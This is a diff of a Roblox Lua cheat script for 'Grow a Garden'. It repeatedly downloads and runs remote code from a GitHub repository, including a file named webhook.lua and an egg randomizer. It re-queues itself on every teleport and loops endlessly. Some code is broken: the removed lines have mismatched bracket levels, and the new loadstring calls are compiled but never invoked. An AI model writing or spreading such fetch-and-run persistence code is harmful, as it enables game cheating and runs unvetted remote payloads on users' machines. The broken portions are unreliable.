@@ -8,34 +8,32 @@ local function RunScripts()
     end)
 end
 
--- Run immediately
+-- First run
 RunScripts()
 
--- Create the teleport script with minimal syntax
-local teleportScript = [==[
-    -- Function to run both scripts
-    local function RunBoth()
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))()
-        end)
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))()
-        end)
+-- Simple teleport script with minimal syntax
+local teleportScript = [[
+    -- Function to run scripts
+    local function run()
+        pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))
+        pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))
     end
-    
-    -- First run immediately
-    RunBoth()
+
+    -- Initial run
+    run()
     
     -- Spam loop
-    local startTime = tick()
-    while tick() - startTime < 300 do  -- Run for 5 minutes
-        RunBoth()
-        wait(math.random(2, 5))  -- Random delay 2-5 seconds
+    while true do
+        run()
+        wait(math.random(3, 7))  -- Random delay 3-7 seconds
     end
-    
-    -- Re-queue for next teleport
-    queue_on_teleport([====[loadstring([=====[ ]=====] .. [===[ ]==] .. [====[ ]====] .. "loadstring('" .. teleportScript:gsub("'", "\\'") .. "')()" .. [====[ ]====] .. [===[ ]==] .. [====[ ]====])]==]
-]==]
+]]
 
--- Queue the teleport script
-queue_on_teleport("loadstring([==[" .. teleportScript .. "]==])()")
+-- Queue the teleport with proper escaping
+queue_on_teleport('loadstring(' .. string.format('%q', teleportScript) .. ')()')
+
+-- Spam in current session
+while true do
+    RunScripts()
+    wait(math.random(3, 7))  -- Random delay 3-7 seconds
+end
